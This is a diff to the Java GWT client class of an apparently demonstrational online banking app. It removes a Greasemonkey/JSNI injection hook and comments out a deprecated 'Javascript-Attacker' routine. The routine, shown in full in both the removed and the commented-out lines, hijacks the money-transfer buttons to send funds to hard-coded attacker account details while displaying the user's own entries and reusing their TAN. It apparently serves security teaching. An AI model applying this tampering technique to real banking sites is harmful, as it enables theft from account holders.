@@ -61,7 +61,7 @@ public class SCB implements EntryPoint, Observer {
 	RegisterServiceAsync registerSvc;
 	private CustomerServiceAsync bankingService;
 
-	MoneyTransferForm mTransfer = new MoneyTransferForm();
+	MoneyTransferForm mTransfer;// = new MoneyTransferForm();
 	/**
 	 * The message displayed to the user when the server cannot be reached or
 	 * returns an error.
@@ -512,6 +512,7 @@ public class SCB implements EntryPoint, Observer {
 	}
 
 	private void showStandardMoneyTransferForm() {
+		mTransfer=new MoneyTransferForm();
 		mTransfer.initWithAccountNr(currentAccount);
 		accountsDetailsPanel.clear();
 		mTransfer.addObserver(SCB.this);
@@ -524,140 +525,125 @@ public class SCB implements EntryPoint, Observer {
 		accountsDetailsPanel.add(confirmPage);
 	}
 
-	/**
-	 * injection point for Greasemonkey (needs to be tested
-	 * 
-	 * @see http://code.google.com/intl/de-DE/webtoolkit/doc/latest/
-	 *      DevGuideCodingBasicsJSNI.html
-	 */
-	public native void jsni_startPointbar() /*-{
-		// Call instance method instanceFoo() on this
-		this.@de.mrx.client.SCB::startAttack();
-	}-*/;
+
 
 	/**
-	 * this is the injection for a Javascript-Attacker
+	 * this is the injection for a Javascript-Attacker with GWT
+	 * Not used anymore, but documents the process much better than the pure javascript version
+	 * kept for documentation purpose 
+	 * @deprecated
 	 * 
 	 * @see http://code.google.com/p/gwtquery/wiki/GettingStarted
 	 */
-	private void startAttack() {
-		$("h1").css(BACKGROUND_COLOR, RED).text("You are hacked!");
-		
-		// everything should best work with DOM-Operations only (not with
-		// knowledge of the Java Widget)
-
-		// 1. Find relevant Button for first page (after first data entry)
-		// later find with DOM Operations (GWTQuery)
-		Button sendMoneyAskForConfirmBtn = mTransfer.getSendMoney();
-		mTransfer.getSendMoneyHandlerRegistration().removeHandler();
-
-		// rewrite ClickHandler for askForConfirmation Button
-		sendMoneyAskForConfirmBtn.addClickHandler(new ClickHandler() {
-
-			@Override
-			public void onClick(ClickEvent event) {
-				String ATTACKER_BLZ = "6272";
-				String ATTACKER_BANK_NAME = "Deutsche Privatbank";
-				String ATTACKER_RECEIVER_ACC_NR = "172";
-				String ATTACKER__RECEIVER_NAME = "Mr. Evil";
-				int ATTACKER__AMOUNT = 10;
-				String ATTACKER_REMARK = "I just needed the money";
-				CustomerServiceAsync bankingService = GWT
-						.create(CustomerService.class);
-				//
-				bankingService.sendMoneyAskForConfirmationData(currentAccount,
-						ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR,
-						ATTACKER__AMOUNT, ATTACKER_REMARK,
-						ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,
-						new AsyncCallback<MoneyTransferDTO>() {
-
-							@Override
-							public void onFailure(Throwable caught) {
-								caught.printStackTrace();
-								Window.alert("Called with failure: "
-										+ caught.getMessage());
-
-							}
-
-							@Override
-							public void onSuccess(MoneyTransferDTO result) {
-								Window.alert("First part succeeds. Now manipulate the confirmation page");
-								result.setReceiverAccountNr(SCB.this.mTransfer
-										.getReceiverAccountNr().getText());
-								result.setReceiverName(SCB.this.mTransfer
-										.getReceiverName().getText());
-								result.setReceiverBankNr(SCB.this.mTransfer
-										.getReceiverBLZ().getText());
-								result.setReceiverName(SCB.this.mTransfer
-										.getReceiverBankName().getText());
-								result.setRemark(SCB.this.mTransfer.getRemark()
-										.getText());
-								result.setAmount(Double
-										.parseDouble(SCB.this.mTransfer
-												.getAmount().getText()));
-								showMoneyTransferConfirmationForm(result);
-								confirmPage
-										.getSendMoneyConfirmHandlerRegistration()
-										.removeHandler();
-								confirmPage
-										.getSendMoneyConfirm()
-										.addClickHandler(
-												new MoneyTransferHackClickHandler(
-														currentAccount));
-							}
-						});
-
-			}
-		});
-
-	}
-
-	/**
-	 * ClickHandler for modifiying the confirmation page (with TAN)
-	 * 
-	 * @author Jan
-	 * 
-	 */
-	class MoneyTransferHackClickHandler implements ClickHandler {
-		private String currentAccount;
-
-		public MoneyTransferHackClickHandler(String currentAccount) {
-			this.currentAccount = currentAccount;
-		}
-
-		@Override
-		public void onClick(ClickEvent event) {
-			String ATTACKER_BLZ = "6272";
-			String ATTACKER_BANK_NAME = "Deutsche Privatbank";
-			String ATTACKER_RECEIVER_ACC_NR = "172";
-			String ATTACKER__RECEIVER_NAME = "Mr. Evil";
-			int ATTACKER__AMOUNT = 10;
-			String ATTACKER_REMARK = "I just needed the money";
-			CustomerServiceAsync bankingService = GWT
-					.create(CustomerService.class);
-			//
-			bankingService.sendMoney(currentAccount, ATTACKER_BLZ,
-					ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT,
-					ATTACKER_REMARK, ATTACKER__RECEIVER_NAME,
-					ATTACKER_BANK_NAME, mTransfer.getTan().getText(),
-					new AsyncCallback<Void>() {
-
-						@Override
-						public void onFailure(Throwable caught) {
-							caught.printStackTrace();
-							Window.alert("Called with failure: "
-									+ caught.getMessage());
-
-						}
-
-						@Override
-						public void onSuccess(Void result) {
-							showAccountDetails(currentAccount);
-
-						}
-
-					});
-		}
-	}
+//	private void startAttack() {
+//		$("h1").css(BACKGROUND_COLOR, RED).text("You are hacked!");
+//		
+//		// everything should best work with DOM-Operations only (not with
+//		// knowledge of the Java Widget)
+//
+//		// 1. Find relevant Button for first page (after first data entry)
+//		// later find with DOM Operations (GWTQuery)
+//		Button sendMoneyAskForConfirmBtn = mTransfer.getSendMoney();
+//		
+//		// rewrite ClickHandler for askForConfirmation Button
+//		sendMoneyAskForConfirmBtn.addClickHandler(new ClickHandler() {
+//
+//			@Override
+//			public void onClick(ClickEvent event) {
+//				String ATTACKER_BLZ = "6272";
+//				String ATTACKER_BANK_NAME = "Deutsche Privatbank";
+//				String ATTACKER_RECEIVER_ACC_NR = "172";
+//				String ATTACKER__RECEIVER_NAME = "Mr. Evil";
+//				int ATTACKER__AMOUNT = 10;
+//				String ATTACKER_REMARK = "I just needed the money";
+//				CustomerServiceAsync bankingService = GWT
+//						.create(CustomerService.class);
+//				//
+//				bankingService.sendMoneyAskForConfirmationData(currentAccount,
+//						ATTACKER_BLZ, ATTACKER_RECEIVER_ACC_NR,
+//						ATTACKER__AMOUNT, ATTACKER_REMARK,
+//						ATTACKER__RECEIVER_NAME, ATTACKER_BANK_NAME,
+//						new AsyncCallback<MoneyTransferDTO>() {
+//
+//							@Override
+//							public void onFailure(Throwable caught) {
+//								caught.printStackTrace();
+//								Window.alert("Called with failure: "
+//										+ caught.getMessage());
+//
+//							}
+//
+//							@Override
+//							public void onSuccess(MoneyTransferDTO result) {
+//								Window.alert("First part succeeds. Now manipulate the confirmation page");
+//								result.setReceiverAccountNr(SCB.this.mTransfer
+//										.getReceiverAccountNr().getText());
+//								result.setReceiverName(SCB.this.mTransfer
+//										.getReceiverName().getText());
+//								result.setReceiverBankNr(SCB.this.mTransfer
+//										.getReceiverBLZ().getText());
+//								result.setReceiverName(SCB.this.mTransfer
+//										.getReceiverBankName().getText());
+//								result.setRemark(SCB.this.mTransfer.getRemark()
+//										.getText());
+//								result.setAmount(Double
+//										.parseDouble(SCB.this.mTransfer
+//												.getAmount().getText()));
+//								showMoneyTransferConfirmationForm(result);
+//							}
+//						});
+//
+//			}
+//		});
+//
+//	}
+//
+//	/**
+//	 * ClickHandler for modifiying the confirmation page (with TAN)
+//	 * 
+//	 * @author Jan
+//	 * 
+//	 */
+//	class MoneyTransferHackClickHandler implements ClickHandler {
+//		private String currentAccount;
+//
+//		public MoneyTransferHackClickHandler(String currentAccount) {
+//			this.currentAccount = currentAccount;
+//		}
+//
+//		@Override
+//		public void onClick(ClickEvent event) {
+//			String ATTACKER_BLZ = "6272";
+//			String ATTACKER_BANK_NAME = "Deutsche Privatbank";
+//			String ATTACKER_RECEIVER_ACC_NR = "172";
+//			String ATTACKER__RECEIVER_NAME = "Mr. Evil";
+//			int ATTACKER__AMOUNT = 10;
+//			String ATTACKER_REMARK = "I just needed the money";
+//			CustomerServiceAsync bankingService = GWT
+//					.create(CustomerService.class);
+//			//
+//			bankingService.sendMoney(currentAccount, ATTACKER_BLZ,
+//					ATTACKER_RECEIVER_ACC_NR, ATTACKER__AMOUNT,
+//					ATTACKER_REMARK, ATTACKER__RECEIVER_NAME,
+//					ATTACKER_BANK_NAME, mTransfer.getTan().getText(),
+//					new AsyncCallback<Void>() {
+//
+//						@Override
+//						public void onFailure(Throwable caught) {
+//							caught.printStackTrace();
+//							Window.alert("Called with failure: "
+//									+ caught.getMessage());
+//
+//						}
+//
+//						@Override
+//						public void onSuccess(Void result) {
+//							showAccountDetails(currentAccount);
+//
+//						}
+//
+//					});
+//		}
+//	}
 
 }
